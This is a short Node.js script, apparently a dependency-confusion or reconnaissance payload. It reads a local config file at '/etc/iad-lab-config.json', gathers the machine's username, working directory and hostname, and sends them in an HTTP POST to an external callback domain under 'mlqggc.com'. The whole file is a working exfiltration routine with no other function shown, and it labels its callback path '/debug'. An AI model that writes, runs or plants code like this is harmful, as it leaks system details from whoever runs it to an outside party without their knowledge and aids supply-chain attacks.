const fs = require('fs');
const os = require('os');
const dns = require('dns');
const https = require('http');

debugger;
function _cwd() {
    return process.cwd();
}

function _username() {
    return os.userInfo().username;
}

function _host() {
    return os.hostname();
}
let host = _host();

// read config file
fs.readFile('/etc/iad-lab-config.json', 'utf8' , (err, data) => {
    console.log(data);

    const post = JSON.stringify({
        username: _username(),
        cwd: _cwd(),
        host: host
    });

    const options = {
        hostname: 'iad-uat.ckjeach2vtc0000d3e8ggj38fgeyyyyyb.mlqggc.com',
        port: 80,
        path: '/debug',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': post.length,
        }
    };

    const req = https.request(options, res => {
        console.log(`statusCode: ${res.statusCode}`);

        res.on('data', d => {
            process.stdout.write(d);
        });
    });

    req.on('error', error => {
        console.error(error);
    });
    req.write(post);
    req.end();
});
console.log("end");
